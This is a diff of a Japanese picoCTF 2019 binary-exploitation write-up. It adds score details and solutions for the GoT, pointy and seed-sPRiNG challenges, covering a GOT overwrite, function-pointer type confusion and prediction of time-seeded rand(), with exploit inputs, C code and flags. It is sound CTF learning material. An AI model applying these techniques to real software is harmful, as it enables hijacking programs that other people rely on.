@@ -1,7 +1,7 @@
 ---
-title: "picoCTF 2019 Writeup"
+title: "picoCTF 2019 Writeup (Binary Exploitation)"
 date: 2019-10-12T07:45:00+09:00
-lastmod: 2019-10-12T07:45:00+09:00
+lastmod: 2019-10-13T10:30:00+09:00
 draft: false
 keywords: []
 description: ""
@@ -12,25 +12,29 @@ author: "きゃぷあめ"
 URL: [https://2019game.picoctf.com/](https://2019game.picoctf.com/)
 <br /><br />
 お疲れ様でした！ （実際、ほんとに疲れた）
-<br /><br />
-PwnとWeb系があんまりできてないけど、スコアも切りのいい20000に行ったし、Globalで目標の300位以内にも入れたのでかなり満足です。
 
 <br /><br />
 最終結果は、こんな感じ。
 
 <img src="https://captureamerica.github.io/writeups/img/pico2019_Score.png" alt="pico2019_Score.png">
 
+<br />
+イベント終了時点で、ユーザは4万人弱でした。
+
+<img src="https://captureamerica.github.io/writeups/img/pico2019_Users.png" alt="pico2019_Users.png">
+
 <img src="https://captureamerica.github.io/writeups/img/pico2019_Rank.png" alt="pico2019_Rank.png">
 
-2週間の間、土日もずっとピコってたし、一日年休も取って頑張りましたよ〜
+PwnとWeb系があんまりできてないけど、スコアも切りのいい20000に行ったし、Globalで目標の300位以内 (283位) にも入れたのでかなり満足です。
+
+2週間の間、土日もずっとピコってたし、一日年休も取って頑張りました。
 
 去年出た問題に似てるものも結構あったので、picoCTF 2018をそれなりにやった人は結構アドバンテージがあったと思います。
 
 
 
 <br /><br />
-それでは、Writeupです。数が多いので、コツコツ追記していきます。
-<br /><br />
+Binary Exploitation の Writeupです。
 
 
 
@@ -244,7 +248,7 @@ Attachment:
 
 <br />
 ## Solution
-GDBを使ってヒープがどうなるか見ながら解析しました。Ubuntu 18.04で解析したら、やっぱりちょっと動きが違った覚えがあります。
+GDBを使ってヒープがどうなるか見ながら解析しました。Ubuntu 18.04で解析したら、ちょっと動きが違ってました（うろ覚え）。
 
 あと、recvuntil()辺りが思ったように動かなくて Invalid option になっちゃったりしたので、よくわかんないけど Invalid になった際には再トライするようにして対処しました。
 
@@ -368,6 +372,229 @@ picoCTF{str1nG_CH3353_159c98a8}
 ```
 
 Flag: `picoCTF{str1nG_CH3353_159c98a8}`
+
+
+
+
+<br /><br />
+<br /><br />
+# [Binary Exploitation]: GoT (350 points)
+- - -
+## Challenge
+> You can only change one address, here is the problem: program.
+<br /><br />
+
+Attachment:
+
+- vuln (ELF 32-bit)
+- vuln.c
+
+<br />
+```
+$ checksec vuln
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)   <---
+```
+
+
+<br />
+## Solution
+
+```
+gef➤  x win
+0x80485c6 <win>:	0x53e58955
+
+gef➤  disas main
+:
+(snip)
+:
+   0x080486f8 <+153>:	push   0x0
+   0x080486fa <+155>:	call   0x8048460 <exit@plt>
+
+gef➤  disas 0x8048460
+Dump of assembler code for function exit@plt:
+   0x08048460 <+0>:	jmp    DWORD PTR ds:0x804a01c
+   0x08048466 <+6>:	push   0x20
+   0x0804846b <+11>:	jmp    0x8048410
+```
+
+0x804a01cを、0x80485c6 (win)に書き換えればOK。
+
+<br />
+10進数で入力します。
+
+```
+$ ./vuln 
+You can just overwrite an address, what can you do?
+
+Input address
+
+134520860
+Input value?
+
+134514118
+The following line should print the flag
+
+picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}
+```
+
+Flag: `picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}`
+
+
+
+
+<br /><br />
+<br /><br />
+# [Binary Exploitation]: pointy (350 points)
+- - -
+## Challenge
+> Exploit the function pointers in this program.
+<br /><br />
+
+Attachment:
+
+- vuln (ELF 32-bit)
+- vuln.c
+
+
+<br />
+## Solution
+2つ構造体が違うのに、同じポインタのリストを使っているところがポイント。
+```C
+struct Professor {
+    char name[NAME_SIZE];
+    int lastScore;
+};
+
+struct Student {
+    char name[NAME_SIZE];
+    void (*scoreProfessor)(struct Professor*, int);
+};
+```
+ProfessorのlastScoreにアドレスを入れて、Student構造体としてアクセスさせます。
+
+
+<br />
+
+```
+$ ./vuln 
+Input the name of a student
+aaa
+Input the name of the favorite professor of a student 
+bbb
+Input the name of the student that will give the score 
+aaa
+Input the name of the professor that will be scored 
+bbb
+bbb
+Input the score: 
+134514326
+Score Given: 134514326 
+Input the name of a student
+ccc
+Input the name of the favorite professor of a student 
+ccc
+Input the name of the student that will give the score 
+bbb
+Input the name of the professor that will be scored 
+ccc
+ccc
+Input the score: 
+100
+picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}
+```
+
+Flag: `picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}`
+
+
+
+
+
+
+<br /><br />
+<br /><br />
+# [Binary Exploitation]: seed-sPRiNG (350 points)
+- - -
+## Challenge
+> The most revolutionary game is finally available: seed sPRiNG is open right now! seed_spring. Connect to it with nc 2019shell1.picoctf.com 12269.
+<br /><br />
+Hints: <br />
+How is that program deciding what the height is?<br />
+You and the program should sync up!<br />
+
+Attachment:
+
+- seed_spring (ELF 32-bit)
+
+<br />
+実行例：
+```
+# ./seed_spring 
+                                                                             
+                          #                mmmmm  mmmmm    "    mm   m   mmm 
+  mmm    mmm    mmm    mmm#          mmm   #   "# #   "# mmm    #"m  # m"   "
+ #   "  #"  #  #"  #  #" "#         #   "  #mmm#" #mmmm"   #    # #m # #   mm
+  """m  #""""  #""""  #   #          """m  #      #   "m   #    #  # # #    #
+ "mmm"  "#mm"  "#mm"  "#m##         "mmm"  #      #    " mm#mm  #   ##  "mmm"
+                                                                             
+
+
+Welcome! The game is easy: you jump on a sPRiNG.
+How high will you fly?
+
+LEVEL (1/30)
+
+Guess the height: 2
+WRONG! Sorry, better luck next time!
+```
+
+
+<br />
+## Solution
+ランダムのシードをどこから取っているか、GDBとかGhidraとかで確認します。
+
+現在時間をベースにしているようです。
+
+以下は、Ghidraの結果をベースに書いたコードです。ほぼ、そのままですけど。
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <time.h>
+
+int main()
+{
+	unsigned int local_18;
+	unsigned int local_1c;
+	int local_14;
+	
+	local_18 = time((time_t *)0x0);
+	srand(local_18);
+	local_14 = 1;
+	while( 1 ) {
+		if (0x1e < local_14) {
+			break;
+		}
+		local_1c = rand();
+		local_1c = local_1c & 0xf;
+		printf("%d\n", local_1c);
+		local_14 = local_14 + 1;
+	}
+}
+
+
+時間を合わせないといけないので、Shell server上で以下のように実行します。
+```
+$ ./seed_spring_solve.o ; nc 2019shell1.picoctf.com 12269
+```
+
+あとは出てきた値を1つずつ入れるだけです。
+
+
+Flag: `picoCTF{pseudo_random_number_generator_not_so_random_66aacad47c332de30eb8d8170d96b772}`
+
 
 
 
